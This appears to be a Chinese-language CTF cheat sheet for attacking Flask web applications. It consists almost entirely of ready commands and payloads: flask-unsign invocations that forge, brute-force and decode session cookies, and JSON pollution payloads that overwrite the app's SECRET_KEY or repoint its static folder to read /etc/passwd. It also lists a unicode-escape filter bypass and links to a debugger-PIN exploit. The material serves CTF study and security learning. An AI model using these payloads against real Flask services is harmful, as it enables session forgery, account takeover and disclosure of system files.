- uncicode 绕过 `\u0069`
- [原型链](#原型链污染)覆盖 SECRET_KEY , session 伪造
- 原型链覆盖 `_static_folder` , 访问 /static/etc/passwd

## flask session

需要得到 secret,

```sh
pip install flask-unsign
flask-unsign --sign --cookie "{'balance': 666666}" --secret "XMM<XMK"

flask-unsign --unsign --cookie "eyJ1c2VyIjoiaWRkbm0ifQ.YyVDmQ.nXit643ch5T34u092IJSngKbCwI" --wordlist dict.txt
flask-unsign --decode --cookie "eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8"
```

## 原型链污染

1. 覆盖 SECRET_KEY, 然后伪造 session

```json
{
  "__init\u005f_": {
    "__globals\u005f_": {
      "app": {
        "config": {
          "SECRET_KEY": "aaa"
        }
      }
    }
  },
  "username": 1,
  "password": 1
}
```

2. 覆盖 `_static_folder` 静态文件路径, 然后读 http://x.x/static/etc/passwd

```json
{
  "username": "test",
  "password": "test",
  "__init\u005f_": {
    "__globals__": {
      "app": {
        "_static_folder": "/"
      }
    }
  }
}
```

## flask 原型链污染获取 PIN 码

[Link](../../../../../blog/text/docs/ctf/scripts/web/web_flask_pin_%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.zip)

# Article
[WP | Python原型链污染赛题Sanic解析](https://mp.weixin.qq.com/s/fhMBt6GUTMBR-VSgMjpLAg)
